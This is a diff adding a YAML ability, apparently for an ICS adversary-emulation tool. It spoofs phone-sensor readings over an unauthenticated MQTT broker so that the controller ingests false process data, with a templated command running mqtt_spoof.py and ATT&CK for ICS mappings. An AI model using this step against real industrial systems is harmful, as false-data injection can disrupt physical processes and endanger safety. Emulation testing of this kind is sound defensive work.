@@ -1,0 +1,21 @@
+---
+
+- id: 9bfa1525-7095-48f3-92fb-fa4c7a34687a
+  name: MQTT - Spoof Phone Sensor Reading
+  description: |
+    Publish a forged phone-sensor value to the unauthenticated broker. The controller ingests
+    it as a network-only phone point (Modbus 140-165, each with its own freshness flag) and the
+    ladder acts on it: false-data injection on the process input image. A spoofed value is just
+    as fresh as a real one. CWE-345 (insufficient verification of data authenticity) / CWE-306
+    (missing authentication). The effect on the controller is T0835 Manipulate I/O Image.
+  tactic: impair-process-control
+  technique_id: T0856
+  technique_name: Spoof Reporting Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      python3 mqtt_spoof.py --broker #{mqtt.broker.ip}:#{mqtt.broker.port}
+      --id #{mqtt.phone.id} --topic #{mqtt.phone.topic} --key #{mqtt.phone.key} --value #{mqtt.phone.value}
+    payloads:
+    - mqtt_spoof.py
